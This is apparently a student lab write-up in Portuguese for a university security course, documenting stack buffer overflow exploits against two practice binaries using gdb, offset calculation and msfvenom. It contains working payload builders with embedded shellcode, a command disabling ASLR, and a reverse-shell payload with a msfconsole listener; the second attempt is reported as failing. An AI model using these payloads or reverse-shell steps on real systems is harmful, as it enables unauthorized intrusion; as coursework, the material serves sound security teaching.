# buffer-overflow

My buffer overflow attack for the Computational Security in UFPR

***

## Sumário

- [Sumário](#sumário)
- [Facilitador](#facilitador)
- [Explorando o primeiro buffer overflow](#explorando-o-primeiro-buffer-overflow)
  - [Objetivo](#objetivo)
  - [Descobrindo o endereço do buffer](#descobrindo-o-endereço-do-buffer)
  - [Descobrindo o endereço do registrador de retorno](#descobrindo-o-endereço-do-registrador-de-retorno)
  - [Descobrindo a distancia entre o buffer e o registrador de retorno](#descobrindo-a-distancia-entre-o-buffer-e-o-registrador-de-retorno)
  - [Preparando o Shellcode](#preparando-o-shellcode)
- [Explorando o segundo buffer overflow](#explorando-o-segundo-buffer-overflow)
  - [Objetivo](#objetivo-1)
  - [Preparando o shellcode](#preparando-o-shellcode-1)
  - [Executando o shellcode](#executando-o-shellcode)

## Facilitador

Para facilitar o processo vamos desabilitar o ASLR (Address Space Layout Randomization).

```bash
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

***

## Explorando o primeiro buffer overflow

Antes de tudo, vamos analisar se o programa em questão é vunerável a buffer overflow.

Para isso, iremos executar o programa sem input valido e ver o que acontece.

```bash
echo "" | ./bogdb.elf

Digite a senha: 
[!] Errou...
```

Agora, iremos executar o programa com um input maior que o buffer.

```bash
python3 -c "print('A'*50)" | ./bogdb.elf

Digite a senha: 
[!] Errou...

*** Parabéns, você entrou no sistema! ***
Segmentation fault (core dumped)
```

Podemos ver que o programa é vunerável a buffer overflow.

***

### Objetivo

Para explorar o buffer overflow e abrir uma shell, iremos seguir os seguintes passos:

1. descobrir o endereço do do buffer
2. descobrir o endereço do registrador de retorno
3. descobrir a distancia entre o buffer e o registrador de retorno
4. preencher o buffer com um padding, sobrescrever o endereço de retorno por uma variável de ambiente
5. executar o programa

***

### Descobrindo o endereço do buffer

Iremos rodar o executável `bogdb.elf` utilizando o gdb.

Podemos analisar o assembly da função `main` utilizando o comando `disas main`

Veremos algo como:

```assembly
0x0000000000001165 <+0>: push   %rbp
0x0000000000001166 <+1>: mov    %rsp,%rbp
0x0000000000001169 <+4>: sub    $0x10,%rsp
0x000000000000116d <+8>: movl   $0x0,-0x4(%rbp)
0x0000000000001174 <+15>: lea    0xe8d(%rip),%rdi        # 0x2008
0x000000000000117b <+22>: mov    $0x0,%eax
0x0000000000001180 <+27>: call   0x1040 <printf@plt>
0x0000000000001185 <+32>: lea    -0xd(%rbp),%rax
0x0000000000001189 <+36>: mov    %rax,%rdi
0x000000000000118c <+39>: mov    $0x0,%eax
0x0000000000001191 <+44>: call   0x1060 <gets@plt>
0x0000000000001196 <+49>: lea    -0xd(%rbp),%rax
0x000000000000119a <+53>: lea    0xe79(%rip),%rsi        # 0x201a
0x00000000000011a1 <+60>: mov    %rax,%rdi
0x00000000000011a4 <+63>: call   0x1050 <strcmp@plt>
0x00000000000011a9 <+68>: test   %eax,%eax
0x00000000000011ab <+70>: je     0x11bb <main+86>
0x00000000000011ad <+72>: lea    0xe6f(%rip),%rdi        # 0x2023
0x00000000000011b4 <+79>: call   0x1030 <puts@plt>
0x00000000000011b9 <+84>: jmp    0x11ce <main+105>
0x00000000000011bb <+86>: lea    0xe6f(%rip),%rdi        # 0x2031
0x00000000000011c2 <+93>: call   0x1030 <puts@plt>
0x00000000000011c7 <+98>: movl   $0x1,-0x4(%rbp)
0x00000000000011ce <+105>: cmpl   $0x0,-0x4(%rbp)
0x00000000000011d2 <+109>: je     0x11e0 <main+123>
0x00000000000011d4 <+111>: lea    0xe6d(%rip),%rdi        # 0x2048
0x00000000000011db <+118>: call   0x1030 <puts@plt>
0x00000000000011e0 <+123>: mov    $0x0,%eax
0x00000000000011e5 <+128>: leave  
0x00000000000011e6 <+129>: ret    
```

Para conseguir mais informações sobre o programa, iremos adicionar um breakpoint logo antes da função `gets` e rodar o programa.

```gdb
(gdb) b *main+39
```

Para descobrirmos o endereço do buffer podemos fazer:

```gdb
(gdb) p &buff
$2 = (char (*)[9]) 0x7fffffffdc83
```

Assim o endereço do buffer é `0x7fffffffdc83`

***

### Descobrindo o endereço do registrador de retorno

De forma similar, podemos descobrir o endereço do registrador de retorno utilizando:

```gdb
(gdb) info frame
Stack level 0, frame at 0x7fffffffdca0:
 rip = 0x55555555518c in main (bufferoverflow1.c:10); saved rip = 0x7ffff7c29d90
 source language c.
 Arglist at 0x7fffffffdc90, args: 
 Locals at 0x7fffffffdc90, Previous frame's sp is 0x7fffffffdca0
 Saved registers:
  rbp at 0x7fffffffdc90, rip at 0x7fffffffdc98
```

Assim o endereço do registrador de retorno é `0x7fffffffdc98`

***

### Descobrindo a distancia entre o buffer e o registrador de retorno

Para descobrirmos a distancia entre o buffer e o registrador de retorno, basta subtrair os dois endereços:

```gdb
(gdb) p 0x7fffffffdc98 - 0x7fffffffdc83
$6 = 21
```

Isso significa que precisaremos de um padding de `21 bytes` para preencher o buffer e chegar no registrador de retorno.

***

### Preparando o shellcode

Para gerar o shellcode, iremos utilizar o msfvenom:

```bash
msfvenom -p linux/x64/exec -b '\x00' -f python
```

iremos inserir o shellcode na variável de ambiente `SHELLCODE`:

```bash
export SHELLCODE=$(python2 -c 'print "\x48\x31\xc9\x48\x81\xe9\xfd\xff\xff\xff\x48\x8d\x05\xef\xff\xff\xff\x48\xbb\x96\x4c\xb7\xfa\xd0\x9f\x7c\xd5\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\xde\xf4\x98\x98\xb9\xf1\x53\xa6\xfe\x4c\x2e\xaa\x84\xc0\x2e\x8b\xfc\x77\xef\xf5\xd5\x9f\x7c\xd5"')
```

Para descobrir o endereço da variável de ambiente,  vamos utilizar um programa em C que imprime o endereço de uma variável de ambiente.

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char *argv[]) {
    char *ptr;

    if(argc < 3) {
        printf("Usage: %s <environment variable> <target program name>\n", argv[0]);
        exit(0);
    }
    ptr = getenv(argv[1]); /* get env var location */
    ptr += (strlen(argv[0]) - strlen(argv[2]))*2; /* adjust for program name */
    printf("%s will be at %p\n", argv[1], ptr);
}
```

Dessa forma, vamos descobrir que o endereço da variável de ambiente é `0x7FFFFFFFE234`.

***

Vamos gerar o input para o programa utilizando o seguinte comando:

```python
from struct import pack

buf = ""
buf += "A" * 21
buf += pack("<Q", 0x7FFFFFFFE234)
with open("payload.txt", "w") as f:
    f.write(buf)
```

Se executarmos o programa utilizando como input o arquivo `payload.txt`, dentro do gdb, podemos conferir que o valor do RIP foi substituido pelo endereço da variável de ambiente `SHELLCODE`.

```gdb
(gdb) info frame
Stack level 0, frame at 0x7fffffffdc80:
 rip = 0x5555555551a1 in main (bufferoverflow1.c:12); saved rip = 0x7fffffffe234
 source language c.
 Arglist at 0x7fffffffdc70, args: 
 Locals at 0x7fffffffdc70, Previous frame's sp is 0x7fffffffdc80
 Saved registers:
  rbp at 0x7fffffffdc70, rip at 0x7fffffffdc78
(gdb) x/x 0x7fffffffdc78
0x7fffffffdc78: 0xffffe234
```

***

### Executando o shellcode

Para executar o shellcode, vamos utilizar o seguinte comando:

```bash
(cat payload.txt; cat) | ./bogdb.elf
```

receberemos um shell com permissões do usuário que executou o programa.

***

## Explorando o segundo buffer overflow

## introdução

Temos um programa que executa um servidor na porta escolhida. Vamos rodar o programa e enviar comandos para o servidor através do telnet.

```bash
./badserver.elf 1234
```

```bash
telnet localhost 1234
```

Assim podemos enviar comandos para o servidor e receber a resposta.

***

### Objetivo

O objetivo é conseguir executar um shellcode que faça uma shell reversa para o nossa máquina.

***

### Descobrindo o tamanho do buffer

Como não temos o código fonte do programa, vamos utilizar o `gdb-peda` para descobrir o tamanho do buffer.

Usando o comando `pattern create 500`, podemos criar um input de 500 bytes para o programa. Se executarmos o programa com esse input, ele irá travar e o gdb irá nos mostrar o valor dos registradores na hora do travamento.

com isso, conseguimos descobrir o valor do registrador `rip` na hora do travamento:

```gdb
RBP: 0x6141414541412941 ('A)AAEAAa')
```

com isso, podemos descobrir o tamanho do buffer:
  
```gdb
(gdb) pattern offset 0x6141414541412941
7007954260868540737 found at offset: 40
```

Dessa forma, descobrimos que o tamanho máximo do buffer é de `40 bytes`

***

### Preparando o shellcode

Iremos utilizar novamente o msfvenom para gerar o shellcode:

```bash
msfvenom -p linux/x64/shell/reverse_tcp LHOST=192.168.0.10 LPORT=5000 -f python -b "\x00".
```

salvaremos o shellcode resultante em um arquivo `payload.txt`.

***

### Executando o shellcode

Para que a shell reversa funcione, precisamos que o programa execute o shellcode. Para isso, vamos construir nosso payload da seguinte forma:

- Preencher o buffer com 40 bytes de padding
- Preencher sobrescrever o endereço de retorno com um endereço a frente do RIP
- Preencher com alguns NOP's
- Preencher com o shellcode

Nosso programa ficou algo como:

```python
from struct import pack

buf = "A" * 40
buf += pack("<Q", 0x00005555555553FD + 8)  # return address
# add nops
buf += b"\x90" * 100
# add shellcode
buf += b"\x48\x31\xc9\x48\x81\xe9\xef\xff\xff\xff\x48\x8d"
buf += b"\x05\xef\xff\xff\xff\x48\xbb\xd6\x4f\x8e\x24\x93"
buf += b"\xf8\x52\x0a\x48\x31\x58\x27\x48\x2d\xf8\xff\xff"
buf += b"\xff\xe2\xf4\xe7\xb0\xe4\x2d\xcb\x61\xe4\x1a\x9e"
buf += b"\xc6\x58\x69\xa2\x31\x38\x28\x97\x15\xe4\x23\xc9"
buf += b"\xf7\x57\x42\x53\x8f\xf6\x75\xf9\xf2\x13\x53\x86"
buf += b"\x25\xa7\x7c\x0a\x92\x50\x55\xbc\x4e\xd0\x2b\x96"
buf += b"\xb0\xd7\xca\xae\x74\xc6\xb3\xdb\x41\x50\x0a\xc5"
buf += b"\xc7\x4e\x8c\x93\xf2\x03\x42\x5f\xa9\xe4\x34\xc9"
buf += b"\x92\x78\x52\xd9\x4a\xd7\x6c\x16\x38\x2b\x2f\x9f"
buf += b"\xb0\x47\x50\x8b\xaf\x38\x29\x8e\x25\x8e\x4e\x96"
buf += b"\xb0\xdb\xed\x9e\x7e\x78\x2b\x96\xa1\x0b\x55\x9e"
buf += b"\xca\x4e\x5d\x54\x92\x6e\x52\xbc\x4e\xd1\x2b\x96"
buf += b"\xa6\x38\x2c\x8c\x40\x8b\x6c\x16\x38\x2a\xe7\x29"
buf += b"\xa9\x8e\x24\x93\xf8\x52\x0a"


with open("payload.txt", "w") as f:
    f.write(buf)
```

Somamos 8 com o objetivo de pular o endereço de retorno e cair nos NOP's. O endereço de retorno foi descoberto através do comando `info frame` no gdb peda.

Para executar o shellcode, precisamos também de um listener na porta 5000. Para isso, vamos utilizar o msfconsole:

```bash
msfconsole
```

```bash
use exploit/multi/handler
set payload linux/x64/shell/reverse_tcp
set LHOST 192.168.0.10
set LPORT 5000
run
```

Agora, basta executar o programa e enviar o payload:

```bash
./badserver.elf 1234
```

```bash
telnet localhost 1234 < payload.txt
```

Com isso deveriamos receber uma conexão reversa no msfconsole.

Infelizmente não conseguimos realizar a shell reversa. Durante os testes, conseguimos substituir o endereço de retorno, mas não conseguiamos enxergar os NOP's e o shellcode.

```gdb
gdb-peda$ x/50x $rsp
0x7fffffffd810: 0x4141414141414141 0x4141414141414141
0x7fffffffd820: 0x4141414141414141 0x4141414141414141
0x7fffffffd830: 0x0041414141414141 0x0000000000000000
# deveriamos ver os NOP's e o shellcode aqui
0x7fffffffd840: 0x00007ffff7c0d560 0x00007ffff7c7f1b0
0x7fffffffd850: 0x000055555555554a 0x00007fffffffdc40
0x7fffffffd860: 0x00007fffffffdc90 0x00007fffffffddc8
```

***

## Autores

- Vinícius Fontoura de Abreu (GRR20206873)
- Guiusepe Oneda Dal Pai (GRR20210572)
